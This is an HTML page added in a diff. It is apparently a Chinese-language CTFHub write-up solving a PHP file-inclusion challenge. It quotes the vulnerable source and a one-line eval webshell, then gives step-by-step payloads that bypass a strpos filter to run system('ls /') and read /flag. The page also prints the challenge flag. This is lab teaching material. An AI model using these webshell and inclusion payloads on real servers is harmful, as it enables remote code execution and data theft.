@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【CTFHub】Web-RCE 文件包含 Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+        .diff-box { background-color: #f1f8ff; border-left: 4px solid #0366d6; padding: 10px 15px; margin: 15px 0; border-radius: 4px; }
+        .payload-box { background-color: #fafbfc; border: 1px solid #e1e4e8; padding: 10px; border-radius: 6px; margin: 10px 0; }
+        .payload-box p { margin: 5px 0; }
+        .step-box { margin-bottom: 20px; padding: 15px; border: 1px solid #e1e4e8; border-radius: 6px; background-color: #fff; }
+        .step-box h3 { margin-top: 0; color: #24292e; font-size: 1.1em; border-bottom: 1px solid #eaecef; padding-bottom: 5px; }
+        .info-line { margin: 5px 0; }
+        .info-label { font-weight: bold; color: #586069; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a ></p >
+    <h1>【CTFHub】Web-RCE 文件包含 Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.9.26 | <strong>分类：</strong>CTF | <strong>标签：</strong>CTFHub, Web, RCE, 文件包含, 参数分离绕过</p >
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>CTFHub</li>
+        <li><strong>分类：</strong>Web - RCE / 文件包含</li>
+        <li><strong>题目名称：</strong>文件包含</li>
+        <li><strong>环境：</strong>VS Code + 浏览器地址栏 (URL 编码)。</li>
+        <li><strong>目标：</strong>利用服务器未过滤的 <code>include()</code> 函数，结合自带的木马文件，通过参数分离技巧绕过 <code>strpos</code> 过滤，实现任意命令执行。</li>
+    </ul>
+
+    <h2>2. 解题思路与知识点</h2>
+    <p><strong>本关核心考点：</strong>文件包含漏洞的利用与多参数配合绕过过滤。</p >
+    
+    <div class="diff-box">
+        <strong>知识点（比喻说明）：</strong>
+        <ul>
+            <li><strong>文件包含（include）的本质：</strong>如果把服务器比作一家公司，<code>include</code> 就像是把外部文件“复印”过来当成公司内部指令执行。如果复印的是普通的文本（txt），它可能就只是一行字；如果复印的是木马（PHP），它就会作为代码被执行。</li>
+            <li><strong>参数分离战术：</strong>这关的过滤机制（安检员）只检查第一个包裹（<code>file</code> 参数）里有没有违禁品（flag）。我们采取“声东击西”的策略：包裹里只放无关紧要的木头（<code>shell.txt</code>），骗过安检；但进去之后，木马激活，我们再通过另一个隐藏通道（<code>ctfhub</code> 参数）把真正的武器递进去。</li>
+            <li><strong>strpos 逻辑缺陷：</strong>源码使用 <code>!strpos($_GET["file"], "flag")</code>。strpos 查找字符串首次出现的位置，找不到返回 false，开头找到返回 0。<code>!false</code> 和 <code>!0</code> 均为 true，因此只要不含 "flag" 或 "flag" 在开头，都能通过检测。</li>
+        </ul>
+    </div>
+
+    <h2>3. 详细步骤</h2>
+    
+    <div class="step-box">
+        <h3>第一步：源码审计与漏洞定位</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 访问靶场 URL，查看页面回显的 PHP 源码。</p>
+        </div>
+        <pre><code>&lt;?php
+error_reporting(0);
+if (isset($_GET['file'])) {
+    if (!strpos($_GET["file"], "flag")) {
+        include $_GET["file"];
+    } else {
+        echo "Hacker!!!";
+    }
+} else {
+    highlight_file(__FILE__);
+}
+?&gt;
+&lt;hr&gt;
+i have a &lt;a href="shell.txt"&gt;shell&lt;/a&gt;, how to use it ?</code></pre>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>error_reporting(0);</code>：关闭所有报错信息（这使得报错盲注变得困难，所以我们要严格遵循语法）。</li>
+            <li><code>if (isset($_GET['file'])) { ... }</code>：接收 URL 中的 `file` 参数。</li>
+            <li><code>if (!strpos($_GET["file"], "flag"))</code>：检查 `file` 参数的值是否包含 "flag"。如果没有，`strpos` 返回 false，`!false` 为 true，进入下一行。</li>
+            <li><code>include $_GET["file"];</code>：核心漏洞点，将 `file` 指定的文件当作代码包含并执行。</li>
+            <li><code>else { echo "Hacker!!!"; }</code>：如果 `file` 参数包含 "flag" 字符串，则拦截。</li>
+            <li>页面底部的超链接：明确提示存在一个名为 `shell.txt` 的文件，这就是我们破局的钥匙。</li>
+        </ul>
+        <p class="info-line"><span class="info-label">获得信息：</span>存在包含漏洞，过滤逻辑为参数分离战术提供了可乘之机。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第二步：分析木马文件 shell.txt</h3>
+        <div class="payload-box">
+            <p><strong>操作：</strong> 在浏览器直接访问 <code>/shell.txt</code>。</p>
+        </div>
+        <pre><code>&lt;?php eval($_REQUEST['ctfhub']);?&gt;</code></pre>
+        <p class="info-line"><span class="info-label">代码逐行解析：</span></p >
+        <ul>
+            <li><code>eval()</code>：PHP 代码执行函数。</li>
+            <li><code>$_REQUEST['ctfhub']</code>：接收 GET 或 POST 请求中名为 `ctfhub` 的参数值。</li>
+        </ul>
+        <p class="info-line"><span class="info-label">获得信息：</span>这是一个完美的“一句话木马”。只要包含它，我们就可以通过 `?ctfhub=...` 传入任意 PHP 代码执行。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第三步：包含木马并测试连通性</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?file=shell.txt&ctfhub=phpinfo();</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">为什么要输入：</span>利用 <code>?file=shell.txt</code> 成功包含木马（因为 `shell.txt` 里没有 "flag" 字符串，完美绕过检测），同时利用 <code>&ctfhub=phpinfo();</code> 激活木马，执行探针函数。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>页面成功渲染出紫色的 phpinfo 页面。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确认木马执行成功，PHP 5.6.40 环境。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第四步：执行系统命令寻找 Flag</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?file=shell.txt&ctfhub=system('ls /');</code></p>
+            <p><strong>URL编码版：</strong> <code>?file=shell.txt&ctfhub=system(%27ls%20/%27);</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">为什么要输入：</span>调用 <code>system</code> 函数执行 Linux 命令列出根目录，寻找 flag 文件。此时 `file` 参数依旧是安全的 `shell.txt`，过滤机制形同虚设。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span>列出了根目录，发现目标文件 <code>/flag</code>。</p >
+        <p class="info-line"><span class="info-label">获得信息：</span>确定目标 Flag 文件的绝对路径。</p >
+    </div>
+
+    <div class="step-box">
+        <h3>第五步：读取 Flag 并提交</h3>
+        <div class="payload-box">
+            <p><strong>Payload：</strong> <code>?file=shell.txt&ctfhub=system('cat /flag');</code></p>
+            <p><strong>URL编码版：</strong> <code>?file=shell.txt&ctfhub=system(%27cat%20/flag%27);</code></p>
+        </div>
+        <p class="info-line"><span class="info-label">为什么要输入：</span>借助木马，调用 <code>system</code> 命令读取文件内容。</p >
+        <p class="info-line"><span class="info-label">回显结果：</span><code>ctfhub{b780b23000d16d124addfaa0}</code></p >
+        <p class="info-line"><span class="info-label">获得信息：</span>成功获取 Flag，提交通关。</p >
+    </div>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>坑1：`strpos` 的拦截。</strong> 第一反应想直接包含 `/flag`，但 `file=flag` 会被过滤。复盘：遇到过滤不能死磕一个参数，要寻找代码中其他可控的变量（如本题中的 `ctfhub`）进行旁路传递。</li>
+        <li><strong>坑2：URL 转义问题。</strong> 浏览器有时会转义单引号和空格，沿用上一关的习惯，使用 URL 编码 `%27`（单引号）和 `%20`（空格）完美解决。</li>
+    </ul>
+
+    <h2>5. 知识总结</h2>
+    <ul>
+        <li><strong>参数分离战术（旁路攻击）：</strong> 利用多参数传递，一个参数（file）用于骗取服务器的信任，另一个参数（ctfhub）用于执行真正的攻击载荷。</li>
+        <li><strong>文件包含的威力：</strong> 只要目标文件包含成功，里面的 PHP 代码就会被服务器执行，配合一句话木马即可获取极高的控制权限。</li>
+        <li><strong>读文件命令复习：</strong> 先 `ls /` 探路，后 `cat /flag` 读取。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p >
+    </div>
+</body>
+</html>
